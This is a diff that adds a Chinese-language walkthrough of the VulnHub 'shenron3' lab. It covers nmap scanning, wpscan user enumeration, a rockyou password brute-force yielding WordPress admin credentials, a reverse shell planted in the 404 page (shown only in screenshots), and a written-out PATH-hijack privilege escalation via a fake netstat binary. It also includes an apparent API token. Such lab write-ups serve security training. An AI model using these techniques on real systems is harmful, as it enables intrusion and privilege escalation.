@@ -464,3 +464,120 @@ pspy程序扫描出 一个异常文件
 知道账号密码 ，直接su 提权成功
 
 ![image-20220824164951223](vulnhub靶场.assets/image-20220824164951223.png)
+
+# shenron3
+
+## 本机ip
+
+~~~
+10.0.2.4
+~~~
+
+
+
+## 靶机ip
+
+~~~
+10.0.2.17
+~~~
+
+
+
+## 信息收集
+
+1. 端口简要信息
+
+   `nmap -Pn -vvv -p-   10.0.2.17`
+
+   > 80/tcp open  http    syn-ack ttl 64
+
+2. 端口详细信息：
+
+   `nmap -vvv  -p80 -A 10.0.2.17`
+
+   ~~~
+   PORT   STATE SERVICE REASON         VERSION
+   80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
+   |_http-generator: WordPress 4.6
+   |_http-title: shenron-3 | Just another WordPress site
+   | http-methods: 
+   |_  Supported Methods: GET HEAD POST OPTIONS
+   |_http-server-header: Apache/2.4.41 (Ubuntu)
+   
+   ~~~
+
+3. 80端口
+
+   **没有显示CSS样式内容，增加hosts内容**
+
+   ![image-20220826150701048](vulnhub靶场.assets/image-20220826150701048.png)
+
+   ![image-20220826150900595](vulnhub靶场.assets/image-20220826150900595.png)
+
+   ![image-20220826150937065](vulnhub靶场.assets/image-20220826150937065.png)
+
+   
+
+   **样式恢复正常**
+
+   ![image-20220826151055902](vulnhub靶场.assets/image-20220826151055902.png)
+
+   4. 枚举用户
+
+      `wpscan --url http://10.0.2.17/ --enumerate u  --api-token aOUBjJdsfasasfZysYHdeLssfaadqfc `
+
+      ![image-20220826151501598](vulnhub靶场.assets/image-20220826151501598.png)
+
+   5. 密码爆破
+
+      `wpscan --url http://10.0.2.17/ -P /usr/share/wordlists/rockyou.txt  --api-token`
+
+      ![image-20220826160949442](vulnhub靶场.assets/image-20220826160949442.png)
+
+      > admin / iloverockyou
+
+   
+
+   
+
+
+
+
+
+## 漏洞利用
+
+**登录成功，修改404页面为反弹shell**
+
+![image-20220826161913471](vulnhub靶场.assets/image-20220826161913471.png)
+
+成功反弹
+
+![image-20220826161843099](vulnhub靶场.assets/image-20220826161843099.png)
+
+
+
+## 权限提升
+
+**利用刚才admin的密码成功登录用户 shenron**
+
+![image-20220826162059451](vulnhub靶场.assets/image-20220826162059451.png)
+
+![image-20220826164343344](vulnhub靶场.assets/image-20220826164343344.png)
+
+> 执行结果为netstat 命令，**提权思路：利用环境变量提权**
+>
+> 
+
+~~~bash
+cd /tmp
+touch netstat
+chmod 777 netstat
+echo '/bin/bash' > netstat
+export PATH=/tmp:$PATH
+/home/shenron/network
+
+~~~
+
+**提权成功**
+
+![image-20220826164855285](vulnhub靶场.assets/image-20220826164855285.png)
